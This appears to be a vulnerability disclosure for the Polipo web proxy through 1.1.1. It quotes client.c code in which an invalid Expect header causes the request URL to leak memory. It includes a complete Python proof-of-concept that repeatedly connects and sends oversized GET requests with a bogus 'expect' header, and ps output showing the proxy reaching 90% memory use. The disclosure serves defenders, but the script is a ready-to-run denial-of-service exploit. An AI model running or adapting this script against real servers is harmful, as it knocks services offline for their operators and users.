Polipo through 1.1.1,allows remote attackers to cause a denial of service 

# reason

client.c file:

```c
int
httpClientRequest(HTTPRequestPtr request, AtomPtr url)
{
........................
    i = httpParseHeaders(1, url,
                         connection->reqbuf, connection->reqbegin, request,
                         &headers, &body_len, 
                         &cache_control, &condition, &body_te,
                         NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
                         &expect, &range, NULL, NULL, &via, &auth);
    if(i < 0) {
        releaseAtom(url);
        do_log(L_ERROR, "Couldn't parse client headers.\n");
        shutdown(connection->fd, 0);
        request->flags &= ~REQUEST_PERSISTENT;
        connection->flags &= ~CONN_READER;
        httpClientNoticeError(request, 503,
                              internAtom("Couldn't parse client headers"));
        return 1;
    }
........................
    if(expect) {
        if(expect == atom100Continue && REQUEST_SIDE(request)) {
            request->flags |= REQUEST_WAIT_CONTINUE;
        } else {
            httpClientDiscardBody(connection);
            httpClientNoticeError(request, 417,
                                  internAtom("Expectation failed"));
            releaseAtom(expect);
            return 1;
        }
        releaseAtom(expect);
    }

........................
}
```

When the expect variable's value is invalid, the url variable is not freed, which leads to server memory leaks and thus denial-of-service

# poc

```Python
#!/bin/python3
import socket
import random
import threading

host = '127.0.0.1'
port = 8123
bigBufferSize = (32 * 1024)
ascii_chars = [chr(i) for i in range(33, 127)]

while True:
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))
    evil_url = ''.join(random.choices(ascii_chars, k=32700))
    data = ("GET "+ evil_url + " HTTP/1.0" +"\nexpect:CCC\n\n").encode()
    client_socket.sendall(data)
    client_socket.close()
```

# result

```
sysirq@debian:~$ ps -p 12141 -o %mem,rss,vsz,cmd
%MEM   RSS    VSZ CMD
90.0 7320868 8180100 ./polipo
sysirq@debian:~$ ps -p 12141 -o %mem,rss,vsz,cmd
%MEM   RSS    VSZ CMD
```

